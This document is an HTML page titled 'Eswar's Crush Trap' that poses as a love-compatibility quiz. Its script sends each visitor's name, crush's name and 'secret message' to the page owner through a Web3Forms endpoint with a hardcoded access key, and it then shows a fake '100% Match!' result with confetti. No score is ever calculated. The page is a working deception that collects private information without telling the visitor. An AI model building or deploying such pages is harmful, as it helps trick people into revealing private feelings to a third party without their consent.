<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Eswar's Crush Trap</title>
  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Poppins', sans-serif;
    }
    body {
      background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 99%, #fecfef 100%);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    .card {
      background: rgba(255, 255, 255, 0.85);
      backdrop-filter: blur(10px);
      padding: 30px;
      border-radius: 20px;
      box-shadow: 0 8px 32px 0 rgba(255, 105, 180, 0.37);
      width: 100%;
      max-width: 400px;
      text-align: center;
    }
    h2 {
      color: #ff4757;
      margin-bottom: 20px;
    }
    .input-group {
      margin-bottom: 15px;
      text-align: left;
    }
    label {
      display: block;
      margin-bottom: 5px;
      color: #555;
      font-weight: 600;
    }
    input, textarea {
      width: 100%;
      padding: 12px;
      border: 2px solid #ffccd5;
      border-radius: 10px;
      outline: none;
      font-size: 14px;
    }
    input:focus, textarea:focus {
      border-color: #ff4757;
    }
    button {
      width: 100%;
      padding: 12px;
      background: #ff4757;
      color: white;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
    }
    button:disabled {
      background: #ccc;
    }
    #success-card {
      display: none;
    }
  </style>
</head>
<body>

  <div class="card" id="form-card">
    <h2>✨ Compatibility Test ✨</h2>
    <form id="crush-form">
      <div class="input-group">
        <label>Your Name:</label>
        <input type="text" id="name" required placeholder="Enter your name">
      </div>
      <div class="input-group">
        <label>Your Crush's Name:</label>
        <input type="text" id="crush" required placeholder="Enter crush's name">
      </div>
      <div class="input-group">
        <label>Secret Message:</label>
        <textarea id="message" rows="3" placeholder="Write something sweet..."></textarea>
      </div>
      <button type="submit" id="submit-btn">Calculate Compatibility ✨</button>
    </form>
  </div>

  <div class="card" id="success-card">
    <h2>💖 100% Match! 💖</h2>
    <p>Your love compatibility score is astronomical! Details have been calculated successfully.</p>
  </div>

  <script>
    const form = document.getElementById('crush-form');
    // PASTE YOUR FULL WEB3FORMS ACCESS KEY HERE:
    const ACCESS_KEY = "b2f83afa-340b-450f-8822-aa590c1c3d46"; // Ensure your full key from Web3Forms is here

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const submitBtn = document.getElementById('submit-btn');
      submitBtn.innerText = "Processing...";
      submitBtn.disabled = true;

      const payload = {
        access_key: ACCESS_KEY,
        name: document.getElementById('name').value,
        crush: document.getElementById('crush').value,
        message: document.getElementById('message').value
      };

      try {
        const response = await fetch('https://api.web3forms.com/submit', {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify(payload)
        });

        const result = await response.json();

        if (result.success) {
          confetti({
            particleCount: 100,
            spread: 70,
            origin: { y: 0.6 }
          });

          document.getElementById('form-card').style.display = 'none';
          document.getElementById('success-card').style.display = 'block';
        } else {
          alert("Submission error: " + result.message);
          submitBtn.innerText = "Calculate Compatibility ✨";
          submitBtn.disabled = false;
        }
      } catch (err) {
        alert("Oops! Something went wrong. Check your connection.");
        submitBtn.innerText = "Calculate Compatibility ✨";
        submitBtn.disabled = false;
      }
    });
  </script>
</body>
</html>
